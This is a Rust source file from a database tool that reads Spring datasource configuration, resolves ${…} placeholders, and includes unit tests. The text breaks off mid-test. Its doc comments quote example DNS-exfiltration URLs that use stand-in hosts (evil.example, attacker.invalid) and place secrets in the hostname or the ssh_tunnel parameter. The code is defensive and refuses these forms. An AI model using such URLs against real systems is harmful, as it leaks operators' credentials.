//! Discover datasource settings from a Spring project's configuration.
//!
//! `application.properties` parsing lives in [`parse_properties_partials`];
//! `application.yml` in [`parse_yaml_partials`] (via [`flatten_yaml`]).
//! [`resolve_placeholders`]
//! resolves the `${NAME}` / `${NAME:default}` placeholders those parsers
//! leave untouched, against a caller-supplied lookup (`main.rs` wires
//! `std::env::var`).

use std::path::Path;

/// True if `dir` looks like a Java project root (Maven or Gradle).
pub fn detect_java_project(dir: &Path) -> bool {
    ["pom.xml", "build.gradle", "build.gradle.kts"]
        .iter()
        .any(|f| dir.join(f).is_file())
}

/// A possibly-**partial** datasource block: any of `url` /
/// `username` / `password` may be absent. This is what a Spring
/// *profile* overlay (`application-prod.yml`) looks like — it
/// commonly carries just a password or just a URL, expecting the
/// base `application.yml` to supply the rest. [`merge_partials`]
/// folds an overlay onto a base; [`parse_properties_partials`]
/// produces these unfiltered — deciding which prefixes are actually
/// datasources happens at pick emission (`main.rs`), using the raw URL
/// and [`is_datasource_prefix`].
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct SpringDatasourcePartial {
    pub prefix: String,
    pub url: Option<String>,
    pub username: Option<String>,
    pub password: Option<String>,
}

/// Parse every `<prefix>.{url,username,password}` triple from a
/// `.properties` body into [`SpringDatasourcePartial`]s, in
/// first-appearance order of the prefix (across **any** field, so
/// a password-only prefix is still emitted — that's the whole
/// point for profile overlays). No filtering: non-datasource
/// prefixes (`service.url`, …) are dropped at pick emission by
/// the JDBC-URL check + [`is_datasource_prefix`].
pub fn parse_properties_partials(text: &str) -> Vec<SpringDatasourcePartial> {
    use std::collections::HashMap;

    let mut order: Vec<String> = Vec::new();
    let mut entries: HashMap<String, SpringDatasourcePartial> = HashMap::new();

    for line in text.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') || line.starts_with('!') {
            continue;
        }
        let Some(sep) = line.find(['=', ':']) else {
            continue;
        };
        let key = line[..sep].trim();
        let value = line[sep + 1..].trim();

        let (prefix, field) = if let Some(p) = key.strip_suffix(".url") {
            (p.to_string(), "url")
        } else if let Some(p) = key.strip_suffix(".username") {
            (p.to_string(), "username")
        } else if let Some(p) = key.strip_suffix(".password") {
            (p.to_string(), "password")
        } else {
            continue;
        };

        if !entries.contains_key(&prefix) {
            order.push(prefix.clone());
            entries.insert(
                prefix.clone(),
                SpringDatasourcePartial {
                    prefix: prefix.clone(),
                    ..Default::default()
                },
            );
        }
        let entry = entries.get_mut(&prefix).expect("just inserted");
        match field {
            "url" => entry.url = Some(value.to_string()),
            "username" => entry.username = Some(value.to_string()),
            "password" => entry.password = Some(value.to_string()),
            _ => {}
        }
    }

    order
        .into_iter()
        .filter_map(|p| entries.remove(&p))
        .collect()
}

/// True when `prefix` names a datasource by convention: its last
/// dot-separated segment is `datasource` (case-insensitively), or ends
/// in it. Matches `spring.datasource`, `dataSource`, `logDataSource`,
/// `replicaDataSource`; rejects `service`, `swagger`, `mailSender`.
///
/// Used at pick emission alongside the `jdbc:` URL check: a URL that
/// *is* a JDBC one speaks for itself, and a value that isn't (because
/// the whole thing is a `${…}` placeholder, say) still counts when the
/// prefix says datasource. Without the second half,
/// `spring.datasource.url=${SPRING_DATASOURCE_URL}` would vanish from
/// the picker with no message — the exact silent skip that
/// `discover_spring_datasources_keeps_a_whole_url_placeholder_pick`
/// exists to prevent.
pub fn is_datasource_prefix(prefix: &str) -> bool {
    prefix
        .rsplit('.')
        .next()
        .is_some_and(|last| last.to_ascii_lowercase().ends_with("datasource"))
}

/// Overlay `profile` partials onto `base` partials, keyed by
/// prefix — Spring profile semantics. For each prefix the result
/// takes the profile's `url` / `username` / `password` when the
/// profile sets a non-empty value, else the base's. Prefixes only
/// in the base keep their values; prefixes only in the profile are
/// appended. Output order: base order first, then profile-only
/// prefixes. Pure.
pub fn merge_partials(
    base: &[SpringDatasourcePartial],
    profile: &[SpringDatasourcePartial],
) -> Vec<SpringDatasourcePartial> {
    use std::collections::HashMap;
    let overlay_by_prefix: HashMap<&str, &SpringDatasourcePartial> =
        profile.iter().map(|p| (p.prefix.as_str(), p)).collect();

    // Helper: prefer `over` when it carries a non-empty value.
    fn pick(base: &Option<String>, over: Option<&Option<String>>) -> Option<String> {
        let over_val = over.and_then(|o| o.as_ref()).filter(|s| !s.is_empty());
        match over_val {
            Some(v) => Some(v.clone()),
            None => base.clone(),
        }
    }

    let mut out: Vec<SpringDatasourcePartial> = Vec::new();
    let mut seen: std::collections::HashSet<&str> = std::collections::HashSet::new();
    for b in base {
        seen.insert(b.prefix.as_str());
        let o = overlay_by_prefix.get(b.prefix.as_str());
        out.push(SpringDatasourcePartial {
            prefix: b.prefix.clone(),
            url: pick(&b.url, o.map(|o| &o.url)),
            username: pick(&b.username, o.map(|o| &o.username)),
            password: pick(&b.password, o.map(|o| &o.password)),
        });
    }
    for p in profile {
        if !seen.contains(p.prefix.as_str()) {
            out.push(p.clone());
        }
    }
    out
}

/// Split a Spring config-file stem into `(family, profile)`.
/// `"application"` → `("application", None)`;
/// `"application-prod"` → `("application", Some("prod"))`;
/// `"bootstrap-dev"` → `("bootstrap", Some("dev"))`. Splits on the
/// first `-` (Spring's `application-<profile>` convention); a
/// trailing `-` with no profile text is treated as no profile.
pub fn split_config_name(stem: &str) -> (String, Option<String>) {
    match stem.split_once('-') {
        Some((family, profile)) if !profile.is_empty() => {
            (family.to_string(), Some(profile.to_string()))
        }
        _ => (stem.to_string(), None),
    }
}

/// Rank a config file by Spring's format precedence so that, when
/// several base files of one family are merged, the *winning* format
/// is applied last (as the overlay). Spring Boot resolves
/// `application.properties` over `application.yml`/`.yaml` when both
/// define the same key, so `.properties` ranks highest. A higher rank
/// must sort later. Unknown extensions rank lowest.
pub fn format_precedence_rank(filename: &str) -> u8 {
    let lower = filename.to_ascii_lowercase();
    if lower.ends_with(".properties") {
        2
    } else if lower.ends_with(".yml") || lower.ends_with(".yaml") {
        1
    } else {
        0
    }
}

/// YAML counterpart to [`parse_properties_partials`]: flatten the
/// document, then parse partials (url optional, no JDBC filter).
/// Used for profile-overlay merging where a profile file may
/// carry only a password.
///
/// The flattener handles the subset Spring config files use in
/// practice: nested mappings, `key: value` leaves, `#` comments, and
/// quoted string values. YAML lists / multi-line strings / anchors are
/// out of scope — those lines are skipped rather than crashing, which
/// is safe because they never appear in a datasource block.
pub fn parse_yaml_partials(text: &str) -> Vec<SpringDatasourcePartial> {
    let flattened = flatten_yaml(text);
    parse_properties_partials(&flattened)
}

/// Walk a YAML body line-by-line, tracking indent-based nesting, and
/// emit one `path.to.key=value` line per scalar leaf. Pure / testable.
pub fn flatten_yaml(text: &str) -> String {
    // Stack of (indent_cols, key) pairs we've descended into.
    let mut path: Vec<(usize, String)> = Vec::new();
    let mut out = String::new();
    for raw in text.lines() {
        // YAML document separator `---` ends the current document and
        // starts a fresh one. Reset the path stack so a later
        // `spring.datasource.url` in a sibling doc doesn't overwrite an
        // earlier one via the flattened-namespace merge.
        if raw.trim() == "---" || raw.trim() == "..." {
            path.clear();
            continue;
        }
        // Strip an inline `# comment`. Per YAML, a `#` starts a comment
        // only when preceded by whitespace (or it's the first char) AND
        // not inside a quoted string.
        let line = strip_yaml_comment(raw);
        let trimmed = line.trim_end();
        if trimmed.is_empty() {
            continue;
        }
        // Skip list items / anchors / aliases / unsupported constructs —
        // they don't appear inside the keys we care about.
        let first_non_ws = trimmed.trim_start();
        if first_non_ws.starts_with('-')
            || first_non_ws.starts_with('&')
            || first_non_ws.starts_with('*')
        {
            continue;
        }
        let indent = trimmed.len() - first_non_ws.len();
        // Pop any path components whose indent is >= ours — we've
        // dedented past them.
        while path.last().map(|(d, _)| *d >= indent).unwrap_or(false) {
            path.pop();
        }
        // Find the colon that separates key from value. YAML accepts
        // `key:` (no value, opens a child) and `key: value` (leaf).
        let Some(colon) = first_non_ws.find(':') else {
            continue;
        };
        let key = first_non_ws[..colon].trim().to_string();
        if key.is_empty() {
            continue;
        }
        let value_part = first_non_ws[colon + 1..].trim();
        if value_part.is_empty() {
            // YAML ambiguity: `key:` with nothing after is either an
            // empty-string leaf (deliberate blank) or opens a child
            // map. We can't disambiguate without look-ahead, so do
            // BOTH — emit `path.key=` as an empty leaf AND push onto
            // the path stack so any actually-nested children below
            // still resolve as `path.key.child=…`. Downstream (pick
            // emission) drops blocks without a JDBC URL under a
            // datasource-shaped prefix, so the spurious leaf is
            // harmless and the
            // blank password / username case is no longer silently
            // dropped.
            let mut dotted = String::new();
            for (_, segment) in &path {
                dotted.push_str(segment);
                dotted.push('.');
            }
            dotted.push_str(&key);
            out.push_str(&dotted);
            out.push_str("=\n");
            path.push((indent, key));
            continue;
        }
        // Leaf. Build the dotted path and emit a property line.
        let mut dotted = String::new();
        for (_, segment) in &path {
            dotted.push_str(segment);
            dotted.push('.');
        }
        dotted.push_str(&key);
        // Strip surrounding quotes from the value.
        let value = unquote_yaml_scalar(value_part);
        out.push_str(&dotted);
        out.push('=');
        out.push_str(value);
        out.push('\n');
    }
    out
}

/// Strip an inline `# comment` from a YAML line. Honours quotes and
/// requires the `#` to be preceded by whitespace (or sit at the start).
fn strip_yaml_comment(line: &str) -> &str {
    let bytes = line.as_bytes();
    let mut in_single = false;
    let mut in_double = false;
    let mut i = 0;
    while i < bytes.len() {
        let b = bytes[i];
        match b {
            // Inside a double-quoted string, `\X` escapes the next char
            // — including `\"`. Skip the pair so the quote-state
            // doesn't flip mid-string and a later ` #` doesn't get
            // mis-read as a comment.
            b'\\' if in_double && i + 1 < bytes.len() => i += 1,
            b'\'' if !in_double => in_single = !in_single,
            b'"' if !in_single => in_double = !in_double,
            b'#' if !in_single && !in_double => {
                let preceded_by_ws = i == 0 || bytes[i - 1].is_ascii_whitespace();
                if preceded_by_ws {
                    return &line[..i];
                }
            }
            _ => {}
        }
        i += 1;
    }
    line
}

fn unquote_yaml_scalar(s: &str) -> &str {
    let bytes = s.as_bytes();
    if bytes.len() >= 2 {
        let first = bytes[0];
        let last = bytes[bytes.len() - 1];
        if (first == b'"' && last == b'"') || (first == b'\'' && last == b'\'') {
            return &s[1..s.len() - 1];
        }
    }
    s
}

/// Resolve `${NAME}` and `${NAME:default}` placeholders in `value`
/// against `lookup` (e.g. `std::env::var(name).ok()`). `${NAME}`
/// resolves via `lookup(NAME)`; `${NAME:default}` uses `lookup(NAME)`
/// when set, else falls back to `default` (so it never fails — a
/// default always resolves). A `value` with no `${...}` at all comes
/// back unchanged.
///
/// `Err` carries one entry per placeholder that couldn't be resolved:
/// an unset `${NAME}` with no default, or a nested/malformed
/// `${...}` (e.g. `${OUTER:${INNER}}` — Spring supports resolving the
/// default itself as a placeholder; this parser does not attempt
/// that, and flags it instead of guessing).
///
/// Every entry is the placeholder **body** — the text between `${` and
/// `}`, with no wrapper — so a consumer can render any of them
/// uniformly as `${body}`. (Entries used to mix bare names with
/// already-wrapped `${…}` strings, which made callers emit
/// `${${OUTER:${INNER}}}`.)
pub fn resolve_placeholders(
    value: &str,
    lookup: impl Fn(&str) -> Option<String>,
) -> Result<String, Vec<String>> {
    let mut out = String::new();
    let mut missing: Vec<String> = Vec::new();
    let mut rest = value;
    loop {
        let Some(start) = rest.find("${") else {
            out.push_str(rest);
            break;
        };
        out.push_str(&rest[..start]);
        let body_start = start + 2;
        match find_matching_close(&rest[body_start..]) {
            None => {
                // Unterminated `${` — nothing sensible to resolve;
                // flag the rest of the body and stop scanning. The
                // leading `${` is dropped so the entry is a bare body
                // like every other one.
                missing.push(rest[body_start..].to_string());
                break;
            }
            Some(len) => {
                let body = &rest[body_start..body_start + len];
                if body.contains("${") {
                    // Nested placeholder in the name/default — not
                    // attempted, just flagged. The body goes in bare;
                    // wrapping it here is the caller's job.
                    missing.push(body.to_string());
                } else {
                    match body.split_once(':') {
                        Some((name, default)) => match lookup(name) {
                            Some(v) => out.push_str(&v),
                            None => out.push_str(default),
                        },
                        None => match lookup(body) {
                            Some(v) => out.push_str(&v),
                            None => missing.push(body.to_string()),
                        },
                    }
                }
                rest = &rest[body_start + len + 1..];
            }
        }
    }
    if missing.is_empty() {
        Ok(out)
    } else {
        Err(missing)
    }
}

/// The outcome of [`resolve_url_placeholders`].
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct UrlResolution {
    /// The URL with every *permitted* placeholder substituted. Anything
    /// in `in_host` is left as literal `${…}` text — it is never
    /// substituted, so this value is only ever safe to *display*, not
    /// to connect to, while `in_host` is non-empty.
    pub value: String,
    /// Placeholder bodies that `lookup` couldn't resolve (an unset name
    /// with no default, or a nested/malformed placeholder).
    pub missing: Vec<String>,
    /// Placeholder bodies that must **never** be resolved into this
    /// URL, whatever the environment holds:
    ///
    /// - one standing where the host or port goes (the value would
    ///   leave the machine as a DNS lookup to a domain the config
    ///   file chose);
    /// - one standing in the query string (`?ssh_tunnel=${X}` names
    ///   the bastion pgman would spawn `ssh` to, and `?sslmode=${X}`
    ///   picks the transport security);
    /// - every body in the URL when a *permitted* substitution would
    ///   have changed the URL's structure — see
    ///   [`introduces_url_structure`].
    pub in_host: Vec<String>,
}

impl UrlResolution {
    /// True when nothing blocks using `value` as a connection URL.
    pub fn is_clean(&self) -> bool {
        self.missing.is_empty() && self.in_host.is_empty()
    }
}

/// Resolve `${…}` placeholders in a connection URL — but **never** one
/// that would land in the URL's host or port.
///
/// `application*.yml` comes out of the working tree, so whoever wrote
/// the checkout chooses both the placeholder names and the domain they
/// sit under. `url: jdbc:postgresql://${AWS_SECRET_ACCESS_KEY}.example
/// .com/db` exfiltrates the operator's credential over DNS the moment
/// pgman resolves it — no Postgres server needed, just a lookup.
///
/// So resolution is allowed in exactly two places — the userinfo
/// (username / password) and the path (database *name*) — and refused
/// everywhere else: the `host[:port]` component **and the query
/// string**. The query string is not decoration: `conn::Dsn::parse`
/// reads `ssh_tunnel=` out of it and pgman will spawn `ssh` to that
/// target, so `?ssh_tunnel=${SECRET}.evil.example` was the same
/// exfiltration hole in a different component (and `sslmode=` picks
/// the transport security). A placeholder in either is reported in
/// `in_host` and left as literal text, which stops the pick from being
/// connected to at all (`App::refuse_if_unresolved`).
///
/// Resolution in the two permitted places is additionally structural:
/// a value that would introduce a `?`, `&`, `/`, `@` or `=` is refused
/// (see [`introduces_url_structure`]), because a database name of
/// `db?ssh_tunnel=x.evil.com` reaches the same tunnel through the one
/// component this function *does* resolve. There is no partial
/// outcome — the whole URL is refused and every body in it reported,
/// so no half-resolved string can be connected to.
///
/// A URL with no `://` at all — `url: ${SPRING_DATASOURCE_URL}`, or
/// `${PREFIX}//host/db` — has no identifiable host component, so *every*
/// placeholder in it is treated as host-tainting. Same for a
/// placeholder in the scheme.
///
/// Finally, whatever this function decided, `conn::Dsn::parse` gets the
/// last word — because it is the parser's reading that gets connected
/// to. This function finds the authority by cutting at the first `/`,
/// `?` or `#`; the parser (`split_authority`) cuts at the *last* `@`
/// before the query, so that a password may carry `/` and `@`
/// unescaped. Two rules, two answers:
/// `jdbc:postgresql://x@db.example/app@${SECRET}.attacker.invalid:55432/db`
/// had an empty `in_host` here (the placeholder sat in "the path") and a
/// host of `<secret>.attacker.invalid` there, and the environment
/// variable left the machine as a DNS lookup. So after resolving, both
/// the template (placeholders left literal) and the result are parsed
/// as DSNs, and the URL is refused outright unless the two agree byte
/// for byte on host, port, params and `ssh_tunnel` and the template's
/// host holds no `${` ([`authority_agrees_with_parser`]). A parse
/// failure on either side refuses too — fail closed.
pub fn resolve_url_placeholders(
    url: &str,
    lookup: impl Fn(&str) -> Option<String>,
) -> UrlResolution {
    // No parseable authority → the whole string could become a host.
    let Some(scheme_end) = url.find("://") else {
        return refuse_whole_url(url);
    };
    let authority_start = scheme_end + 3;
    let scheme = &url[..authority_start];
    if scheme.contains("${") {
        // `${SCHEME}://…` — we can't reason about what the resolved
        // text would make the authority, so refuse the lot.
        return refuse_whole_url(url);
    }
    let rest = &url[authority_start..];
    let authority_len = rest.find(['/', '?', '#']).unwrap_or(rest.len());
    let authority = &rest[..authority_len];
    let tail = &rest[authority_len..];
    // Split the database name off the query string / fragment. Only
    // the name is resolvable; the params are not — `ssh_tunnel=` and
    // `sslmode=` live there (see the doc comment).
    let path_len = tail.find(['?', '#']).unwrap_or(tail.len());
    let path = &tail[..path_len];
    let params = &tail[path_len..];
    // Split userinfo from host[:port] at the last `@` that isn't inside
    // a `${…}` (a placeholder's default value may contain one).
    let (userinfo, hostport) = match last_top_level_at(authority) {
        Some(i) => (&authority[..=i], &authority[i + 1..]),
        None => ("", authority),
    };

    // host[:port] and the params: never resolved.
    let mut in_host = placeholder_bodies(hostport);
    in_host.extend(placeholder_bodies(params));

    let mut missing = Vec::new();
    // Userinfo: resolved. A password or username from the environment
    // reaches only the server named by the (literal) host.
    let resolved_userinfo = match resolve_placeholders(userinfo, &lookup) {
        Ok(v) => v,
        Err(m) => {
            missing.extend(m);
            userinfo.to_string()
        }
    };
    // Path (database name): resolved.
    let resolved_path = match resolve_placeholders(path, &lookup) {
        Ok(v) => v,
        Err(m) => {
            missing.extend(m);
            path.to_string()
        }
    };
    // Structural check: a value that adds a `?`, `&`, `/`, `@` or `=`
    // reaches past the component it was substituted into — a dbname of
    // `db?ssh_tunnel=x.evil.com`, a username of `me@evil.example`.
    // Refuse the whole URL rather than any part of it.
    if introduces_url_structure(userinfo, &resolved_userinfo)
        || introduces_url_structure(path, &resolved_path)
    {
        return refuse_whole_url(url);
    }
    let value = format!("{scheme}{resolved_userinfo}{hostport}{resolved_path}{params}");
    // The parser gets the last word on where the host is (see the doc
    // comment). Only when there was something to resolve: with
    // `in_host` already non-empty the URL is refused and its host left
    // literal, and with no `${` at all there is nothing to disagree
    // about.
    if in_host.is_empty() && url.contains("${") && !authority_agrees_with_parser(url, &value) {
        return refuse_whole_url(url);
    }
    UrlResolution {
        value,
        missing,
        in_host,
    }
}

/// Refuse `url` as a whole: the value stays the literal text and every
/// placeholder body in it is reported in `in_host`, so no half-resolved
/// string can be connected to.
fn refuse_whole_url(url: &str) -> UrlResolution {
    UrlResolution {
        value: url.to_string(),
        missing: Vec::new(),
        in_host: placeholder_bodies(url),
    }
}

/// The components of a URL a placeholder may never choose, as
/// `conn::Dsn::parse` reads them: host, port, params (where `sslmode=`
/// and `ssh_tunnel=` live) and the tunnel parsed out of them.
type ParserAuthority = (
    String,
    u16,
    Vec<(String, String)>,
    Option<crate::tunnel::SshTunnelSpec>,
);

/// [`ParserAuthority`] of `url`, or `None` when the parser cannot read
/// it. A `jdbc:` prefix is stripped first — that is the form Spring and
/// IntelliJ carry, and `conn::Dsn::parse` wants the bare scheme.
fn parser_authority(url: &str) -> Option<ParserAuthority> {
    let bare = url.strip_prefix("jdbc:").unwrap_or(url);
    let d = crate::conn::Dsn::parse(bare).ok()?;
    Some((d.host, d.port, d.params, d.ssh_tunnel))
}

/// `true` when `conn::Dsn::parse` reads the same host, port, params and
/// tunnel out of `template` (placeholders left literal) and `resolved`,
/// and the template's host holds no `${`. Anything else — either side
/// failing to parse included — is `false` and the caller refuses the
/// URL. This is the check that catches a placeholder
/// [`resolve_url_placeholders`] placed in the path or userinfo but the
/// parser places in the host: the two find the authority by different
/// rules (first `/` here, last `@` there), and what gets connected to is
/// the parser's reading.
fn authority_agrees_with_parser(template: &str, resolved: &str) -> bool {
    match (parser_authority(template), parser_authority(resolved)) {
        (Some(t), Some(r)) => !t.0.contains("${") && t == r,
        _ => false,
    }
}

/// URL characters that move a component boundary: `?` opens the query
/// string, `&` starts another param, `=` splits a param's key from its
/// value, `/` ends the authority (or extends the path), `@` ends the
/// userinfo. A resolved placeholder may only fill the component it
/// sits in, so introducing any of these is refused.
const URL_STRUCTURE_CHARS: [char; 5] = ['?', '&', '/', '@', '='];

/// True when substituting placeholders turned `template` into
/// `resolved` by *adding* one of [`URL_STRUCTURE_CHARS`]. Counted per
/// character rather than tested for presence, so a template that
/// legitimately carries one (`/${DB_NAME}` always has a `/`) still
/// catches a value that brings a second.
///
/// The consequence for a legitimate password holding one of these is
/// that it has to be percent-encoded — which a URL userinfo requires
/// anyway.
fn introduces_url_structure(template: &str, resolved: &str) -> bool {
    URL_STRUCTURE_CHARS
        .iter()
        .any(|c| resolved.matches(*c).count() > template.matches(*c).count())
}

/// Every `${…}` body in `s`, in order. An unterminated `${` yields the
/// rest of the string as its body, matching `resolve_placeholders`.
pub fn placeholder_bodies(s: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut rest = s;
    while let Some(start) = rest.find("${") {
        let body_start = start + 2;
        match find_matching_close(&rest[body_start..]) {
            None => {
                out.push(rest[body_start..].to_string());
                break;
            }
            Some(len) => {
                out.push(rest[body_start..body_start + len].to_string());
                rest = &rest[body_start + len + 1..];
            }
        }
    }
    out
}

/// Index of the last `@` in `s` that sits outside any `${…}`. Used to
/// split userinfo from host[:port] without being fooled by a default
/// value like `${DB_USER:me@example.com}`.
fn last_top_level_at(s: &str) -> Option<usize> {
    let mut found = None;
    let mut depth = 0u32;
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'$' if i + 1 < bytes.len() && bytes[i + 1] == b'{' => {
                depth += 1;
                i += 2;
                continue;
            }
            b'}' if depth > 0 => depth -= 1,
            b'@' if depth == 0 => found = Some(i),
            _ => {}
        }
        i += 1;
    }
    found
}

/// Find the index (relative to `s`, the text right after an opening
/// `${`) of the `}` that closes it, treating any nested `${` as one
/// level of depth. `None` when `s` has no matching close.
fn find_matching_close(s: &str) -> Option<usize> {
    let mut depth = 0u32;
    let mut chars = s.char_indices().peekable();
    while let Some((i, c)) = chars.next() {
        if c == '$' {
            if let Some(&(_, '{')) = chars.peek() {
                chars.next();
                depth += 1;
                continue;
            }
        }
        if c == '}' {
            if depth == 0 {
                return Some(i);
            }
            depth -= 1;
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_maven_and_gradle_projects() {
        let base = std::env::temp_dir().join(format!("pgman-spring-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);

        let maven = base.join("maven");
        std::fs::create_dir_all(&maven).unwrap();
        std::fs::write(maven.join("pom.xml"), "<project/>").unwrap();
        assert!(detect_java_project(&maven));

        let gradle = base.join("gradle");
        std::fs::create_dir_all(&gradle).unwrap();
        std::fs::write(gradle.join("build.gradle.kts"), "").unwrap();
        assert!(detect_java_project(&gradle));

        let plain = base.join("plain");
        std::fs::create_dir_all(&plain).unwrap();
        assert!(!detect_java_project(&plain));

        let _ = std::fs::remove_dir_all(&base);
    }

    #[test]
    fn parse_properties_partials_handles_non_spring_prefix() {
        // Real-world shape: a project that uses `dataSource.*`, not the
        // Spring-Boot-canonical `spring.datasource.*`. Both should work.
        let text = "\
dataSource.url=jdbc:postgresql://localhost:5432/shop?escapeSyntaxCallMode=callIfNoReturn
dataSource.username=shop
dataSource.password=local-dev-placeholder

logDataSource.url=jdbc:postgresql://localhost:5432/shoplog
logDataSource.username=shop
logDataSource.password=local-dev-placeholder
";
        let entries = parse_properties_partials(text);
        assert_eq!(entries.len(), 2);
        assert_eq!(entries[0].prefix, "dataSource");
        assert_eq!(entries[0].username.as_deref(), Some("shop"));
        assert!(entries[0]
            .url
            .as_deref()
            .is_some_and(|u| u.contains("shop")));
        assert_eq!(entries[1].prefix, "logDataSource");
        assert!(entries[1]
            .url
            .as_deref()
            .is_some_and(|u| u.contains("shoplog")));
    }

    #[test]
    fn is_datasource_prefix_accepts_the_conventional_names_only() {
        for good in [
            "spring.datasource",
            "dataSource",
            "logDataSource",
            "replicaDataSource",
            "app.replicaDataSource",
        ] {
            assert!(is_datasource_prefix(good), "{good} should be a datasource");
        }
        for bad in ["service", "swagger", "mailSender", "datasource.pool", ""] {
            assert!(
                !is_datasource_prefix(bad),
                "{bad} should NOT be a datasource"
            );
        }
    }

    #[test]
    fn flatten_yaml_handles_spring_datasource_block() {
        let yaml = "\
spring:
  datasource:
    url: jdbc:postgresql://h:5432/db
    username: alice
    password: s3cret
  profiles:
    active: dev
";
        let flat = flatten_yaml(yaml);
        assert!(flat.contains("spring.datasource.url=jdbc:postgresql://h:5432/db"));
        assert!(flat.contains("spring.datasource.username=alice"));
        assert!(flat.contains("spring.datasource.password=s3cret"));
        assert!(flat.contains("spring.profiles.active=dev"));
    }

    #[test]
    fn flatten_yaml_strips_inline_comments_and_quotes() {
        let yaml = "\
# top-level comment
spring:
  datasource:
    url: \"jdbc:postgresql://h/db\"  # the url
    username: 'alice'
";
        let flat = flatten_yaml(yaml);
        assert!(flat.contains("spring.datasource.url=jdbc:postgresql://h/db"));
        assert!(flat.contains("spring.datasource.username=alice"));
    }

    #[test]
    fn flatten_yaml_skips_lists_and_anchors_without_crashing() {
        // List items and anchors aren't supported but mustn't break the
        // surrounding leaves.
        let yaml = "\
spring:
  profiles:
    - dev
    - test
  datasource:
    url: jdbc:postgresql://h/db
";
        let flat = flatten_yaml(yaml);
        assert!(flat.contains("spring.datasource.url=jdbc:postgresql://h/db"));
    }

    #[test]
    fn parse_yaml_partials_returns_a_datasource_entry() {
        let yaml = "\
spring:
  datasource:
    url: jdbc:postgresql://h/db
    username: alice
    password: secret
";
        let entries = parse_yaml_partials(yaml);
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].prefix, "spring.datasource");
        assert_eq!(entries[0].username.as_deref(), Some("alice"));
        assert!(entries[0]
            .url
            .as_deref()
            .is_some_and(|u| u.contains("postgresql")));
    }

    #[test]
    fn flatten_yaml_resets_path_on_document_separator() {
        // Multi-doc Spring profile files: `---` ends one doc and starts
        // another. Without resetting, the second doc's keys merged with
        // the first via the flat namespace.
        let yaml = "\
spring:
  datasource:
    url: jdbc:postgresql://prod/db
---
spring:
  datasource:
    url: jdbc:postgresql://dev/db
";
        let flat = flatten_yaml(yaml);
        // Both URLs survive as distinct property lines in the flattened
        // output (parse_properties_partials then merges by prefix —
        // that's a different concern; the flattener's job is to not
        // lose either).
        assert!(flat.contains("prod"), "prod URL missing: {flat:?}");
        assert!(flat.contains("dev"), "dev URL missing: {flat:?}");
    }

    #[test]
    fn flatten_yaml_honours_backslash_escape_in_double_quotes() {
        // Escaped `\"` inside a double-quoted string used to flip the
        // comment-stripper's quote state, truncating the value.
        let yaml = r#"
spring:
  datasource:
    password: "a\"b #c"
"#;
        let flat = flatten_yaml(yaml);
        // The value isn't unquoted (mismatched outer quotes after the
        // escape) — that's fine. The KEY POINT is that the full
        // quoted-string body, including the ` #c`, is preserved.
        assert!(
            flat.contains("#c"),
            "comment-stripper truncated inside an escaped quote: {flat:?}"
        );
    }

    #[test]
    fn flatten_yaml_emits_empty_leaf_for_blank_value() {
        // `password:` (deliberately blank) used to be silently dropped
        // because the empty value was always interpreted as opening a
        // child map. Now we emit an empty leaf AND push the path so
        // both interpretations work.
        let yaml = "\
spring:
  datasource:
    url: jdbc:postgresql://h/db
    password:
    username: alice
";
        let flat = flatten_yaml(yaml);
        assert!(
            flat.contains("spring.datasource.password="),
            "blank password not emitted: {flat:?}"
        );
        assert!(flat.contains("spring.datasource.username=alice"));
    }

    #[test]
    fn parse_yaml_partials_finds_non_spring_prefix() {
        // Some Spring apps put the connection straight under top-level
        // `dataSource:` (mirroring the .properties shape).
        let yaml = "\
dataSource:
  url: jdbc:postgresql://localhost:5432/shop
  username: shop
  password: ignored
";
        let entries = parse_yaml_partials(yaml);
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].prefix, "dataSource");
    }

    #[test]
    fn parse_properties_partials_handles_spring_canonical_prefix() {
        let text = "spring.datasource.url=jdbc:postgresql://h/x\n\
                    spring.datasource.username=svc";
        let entries = parse_properties_partials(text);
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].prefix, "spring.datasource");
    }

    fn partial(
        prefix: &str,
        url: Option<&str>,
        user: Option<&str>,
        pass: Option<&str>,
    ) -> SpringDatasourcePartial {
        SpringDatasourcePartial {
            prefix: prefix.to_string(),
            url: url.map(str::to_string),
            username: user.map(str::to_string),
            password: pass.map(str::to_string),
        }
    }

    #[test]
    fn partials_emit_password_only_prefix() {
        // The whole point: a profile overlay that sets only a
        // password must still surface its prefix (with url=None).
        let text = "spring.datasource.password=prod-secret";
        let ps = parse_properties_partials(text);
        assert_eq!(ps.len(), 1);
        assert_eq!(ps[0].prefix, "spring.datasource");
        assert_eq!(ps[0].url, None);
        assert_eq!(ps[0].password.as_deref(), Some("prod-secret"));
    }

    #[test]
    fn partials_keep_non_jdbc_prefixes_for_the_emitter_to_filter() {
        // Partials are unfiltered on purpose — a profile overlay may
        // carry only a password. Pick emission is what drops
        // `service.url`, using the JDBC check + `is_datasource_prefix`.
        let text = "service.url=https://api\nspring.datasource.url=jdbc:postgresql://h/x";
        let ps = parse_properties_partials(text);
        assert_eq!(ps.len(), 2);
        assert_eq!(
            ps.iter()
                .filter(|p| p.url.as_deref().is_some_and(|u| u.starts_with("jdbc:"))
                    || is_datasource_prefix(&p.prefix))
                .count(),
            1
        );
    }

    #[test]
    fn merge_overlays_password_and_inherits_base_url() {
        let base = vec![partial(
            "spring.datasource",
            Some("jdbc:postgresql://db/orders"),
            Some("app"),
            Some("base-pw"),
        )];
        let profile = vec![partial("spring.datasource", None, None, Some("prod-pw"))];
        let merged = merge_partials(&base, &profile);
        assert_eq!(merged.len(), 1);
        // URL + username inherited from base; password overridden.
        assert_eq!(
            merged[0].url.as_deref(),
            Some("jdbc:postgresql://db/orders")
        );
        assert_eq!(merged[0].username.as_deref(), Some("app"));
        assert_eq!(merged[0].password.as_deref(), Some("prod-pw"));
    }

    #[test]
    fn merge_empty_overlay_value_does_not_clobber_base() {
        let base = vec![partial(
            "ds",
            Some("jdbc:postgresql://h/x"),
            Some("u"),
            Some("p"),
        )];
        // Profile present but with empty strings — must not erase base.
